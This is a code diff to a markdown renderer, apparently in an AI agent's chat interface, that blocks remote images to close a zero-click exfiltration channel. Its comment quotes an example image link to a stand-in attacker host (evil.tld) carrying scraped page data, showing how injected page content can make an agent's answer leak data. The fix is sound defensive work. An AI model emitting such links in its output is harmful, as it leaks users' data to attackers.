@@ -80,16 +80,32 @@ function inline(parent: Node, src: string): void {
     }
 
     // Image: ![alt](src)
+    //
+    // Only an inline data: image is drawn. Everything rendered here is model text, and the model's text
+    // is derived from the page it just read, so `![](https://evil.tld/p?d=<what the agent scraped>)` is
+    // an exfiltration channel that needs no click at all: the profile's own network stack would issue
+    // the GET the moment the answer appears. A remote image therefore becomes the same click-through
+    // link a `[label](url)` gets, so the request only happens if the human decides it should. The
+    // manifest's `img-src 'self' data:` enforces the same rule one layer down.
     const image = /^!\[([^\]]*)\]\(\s*([^\s)]+)(?:\s+"[^"]*")?\s*\)/.exec(rest);
     if (image) {
       const url = safeUrl(image[2]!, true);
       flush();
-      if (url) {
+      if (url && /^data:/i.test(url)) {
         const img = document.createElement('img');
         img.setAttribute('src', url);
         img.setAttribute('alt', image[1]!);
         img.setAttribute('loading', 'lazy');
         parent.appendChild(img);
+      } else if (url) {
+        const anchor = document.createElement('a');
+        anchor.setAttribute('href', url);
+        anchor.setAttribute('target', '_blank');
+        anchor.setAttribute('rel', 'noreferrer noopener');
+        // An empty alt is common on tracking pixels; showing the URL keeps the link visible instead of
+        // collapsing to nothing the user cannot see or reason about.
+        anchor.textContent = image[1]! || url;
+        parent.appendChild(anchor);
       } else {
         parent.appendChild(text(image[1]!));
       }
